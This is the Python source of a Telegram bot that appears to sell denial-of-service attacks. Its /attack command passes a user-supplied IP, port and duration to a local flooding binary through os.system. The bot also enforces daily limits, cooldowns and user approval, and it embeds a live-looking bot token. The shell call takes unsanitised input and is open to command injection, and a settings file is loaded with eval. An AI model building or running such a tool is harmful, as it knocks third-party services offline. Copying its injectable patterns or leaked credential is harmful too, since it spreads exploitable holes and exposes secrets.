import os
import threading
import asyncio
import time
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

TOKEN = "6838193855:AAFm2sCuJlN8U4ysZpatPL6pud91nMbT5hk"
ADMIN_ID = "6512242172"
GROUP_ID = "-1002365524959"

USER_FILE = "users.txt"
LOG_FILE = "log.txt"
LIMIT_FILE = "attack_limits.json"

authorized_users = set()
active_attacks = []
user_cooldowns = {}
attack_limits = {}

MAX_CONCURRENT_ATTACKS = 3
ATTACK_COOLDOWN = 60
MAX_ATTACK_DURATION = 180
DEFAULT_DAILY_LIMIT = 10


def log_action(text):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now()}] {text}\n")


def load_users():
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as f:
            for line in f:
                user_id = line.strip().split(" - ")[0]
                authorized_users.add(user_id)


def save_user(user_id):
    now = datetime.now()
    formatted = now.strftime("%H:%M %d/%m/%Y")
    with open(USER_FILE, "a") as f:
        f.write(f"{user_id} - Added on {formatted}\n")


def remove_user_from_file(user_id):
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as f:
            lines = f.readlines()
        with open(USER_FILE, "w") as f:
            for line in lines:
                if not line.startswith(user_id):
                    f.write(line)


def load_limits():
    global attack_limits
    if os.path.exists(LIMIT_FILE):
        with open(LIMIT_FILE, "r") as f:
            attack_limits = eval(f.read())


def save_limits():
    with open(LIMIT_FILE, "w") as f:
        f.write(str(attack_limits))


def is_authorized(chat_id, user_id):
    return (
        str(user_id) == ADMIN_ID or
        str(chat_id) == GROUP_ID or
        str(chat_id).startswith("-100") or
        str(user_id) in authorized_users or
        str(chat_id) in authorized_users
    )


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    user_id = str(update.effective_user.id)
    if not is_authorized(chat_id, user_id):
        return

    await update.message.reply_text(
        "🚀 *Bot is online and ready!*\n"
        "👑 Owner: @offx_sahil\n"
        "📣 Channel: [Join Here](https://t.me/kasukabe0)\n\n"
        "Use /help to see available commands.",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    user_id = str(update.effective_user.id)
    if not is_authorized(chat_id, user_id):
        return

    await update.message.reply_text(
        "🛠 *Bot Commands:*\n"
        "✅ /start - Start the bot\n"
        "✅ /help - Show commands\n"
        "✅ /attack <ip> <port> <duration> - Launch attack\n"
        "✅ /approve <user_id> <limit> - Set daily limit (Admin only)\n"
        "✅ /adduser <id> - Approve user or group (Admin only)\n"
        "✅ /removeuser <id> - Remove access (Admin only)\n"
        "✅ /status - Show active attacks\n"
        "✅ /allusers - List authorized IDs\n"
        "✅ /clearlogs - Clear all logs (Admin only)\n"
        "✅ /mylogs - See your last logs",
        parse_mode="Markdown"
    )


async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⚕️ Only the admin can approve users.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <user_id> <limit>")
        return

    user_id = context.args[0]
    limit = int(context.args[1])
    attack_limits[user_id] = {"limit": limit, "used": 0}
    save_limits()
    await update.message.reply_text(
        f"✅ User `{user_id}` is approved with daily limit `{limit}`.",
        parse_mode="Markdown"
    )


async def adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⚕️ Only admin can approve users.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("Usage: /adduser <user_id>")
        return

    user_id = context.args[0]
    if user_id in authorized_users:
        await update.message.reply_text("⚠️ Already approved.")
        return

    authorized_users.add(user_id)
    save_user(user_id)
    log_action(f"Approved ID: {user_id}")
    await update.message.reply_text(f"✅ `{user_id}` added!", parse_mode="Markdown")


async def removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⚕️ Only admin can remove users.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("Usage: /removeuser <user_id>")
        return

    user_id = context.args[0]
    authorized_users.discard(user_id)
    remove_user_from_file(user_id)
    attack_limits.pop(user_id, None)
    save_limits()
    log_action(f"Removed ID: {user_id}")
    await update.message.reply_text(f"✅ `{user_id}` removed!", parse_mode="Markdown")


def execute_attack(ip, port, duration, chat_id, context):
    active_attacks.append(chat_id)
    os.system(f"./iiipx {ip} {port} {duration}")
    asyncio.run(send_attack_finished_message(chat_id, ip, port, context))
    active_attacks.remove(chat_id)


async def send_attack_finished_message(chat_id, ip, port, context):
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"✅ *Attack Finished!* 🎯 Target `{ip}:{port}`",
        parse_mode="Markdown"
    )


async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    chat_id = str(update.effective_chat.id)

    if not is_authorized(chat_id, user_id):
        await update.message.reply_text("⛔ You are not authorized to use this command!")
        return

    if str(user_id) != ADMIN_ID:
        if user_id not in attack_limits:
            attack_limits[user_id] = {"limit": DEFAULT_DAILY_LIMIT, "used": 0}
        elif attack_limits[user_id]["used"] >= attack_limits[user_id]["limit"]:
            await update.message.reply_text("❌ You reached your daily attack limit.")
            return

    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <duration>")
        return

    ip, port, duration = context.args

    if not duration.isdigit() or int(duration) > MAX_ATTACK_DURATION:
        await update.message.reply_text("⚕️ Max attack time is 180 seconds.")
        return

    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        await update.message.reply_text("⚠️ Max attacks running! Try again later.")
        return

    now = time.time()
    if user_id in user_cooldowns and now - user_cooldowns[user_id] < ATTACK_COOLDOWN:
        wait = int(ATTACK_COOLDOWN - (now - user_cooldowns[user_id]))
        await update.message.reply_text(f"⏳ Wait {wait}s before your next attack.")
        return

    user_cooldowns[user_id] = now
    threading.Thread(target=execute_attack, args=(ip, port, duration, update.effective_chat.id, context)).start()

    log_action(f"UserID: {user_id} started attack on {ip}:{port} for {duration}s")
    if user_id != ADMIN_ID:
        attack_limits[user_id]["used"] += 1
        save_limits()

    await update.message.reply_text(
        f"🔥 *Attack Started!* 🎯 `{ip}:{port}`\n⏳ Duration: {duration}s",
        parse_mode="Markdown"
    )


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(str(update.effective_chat.id), str(update.effective_user.id)):
        return
    count = len(active_attacks)
    await update.message.reply_text(f"📊 Active attacks: *{count}* / {MAX_CONCURRENT_ATTACKS}", parse_mode="Markdown")


async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⚠️ Only admin can use this.")
        return

    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as f:
            content = f.read()
            response = f"🧾 *Authorized Users:*\n{content}" if content.strip() else "No users found."
    else:
        response = "User file not found."

    await update.message.reply_text(response, parse_mode="Markdown")


async def clearlogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⚠️ Only admin can clear logs.")
        return
    open(LOG_FILE, "w").close()
    log_action("Admin cleared logs.")
    await update.message.reply_text("🧹 Logs cleared.")


async def mylogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            logs = [line for line in f.readlines() if f"UserID: {user_id}" in line]
            reply = ''.join(logs[-5:]) if logs else "No logs found."
    else:
        reply = "Log file not found."
    await update.message.reply_text(reply)


def main():
    load_users()
    load_limits()
    authorized_users.add(ADMIN_ID)

    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("mylogs", mylogs))
    app.add_handler(CommandHandler("adduser", adduser))
    app.add_handler(CommandHandler("removeuser", removeuser))
    app.add_handler(CommandHandler("clearlogs", clearlogs))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CommandHandler("approve", approve))

    print("🤖 Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()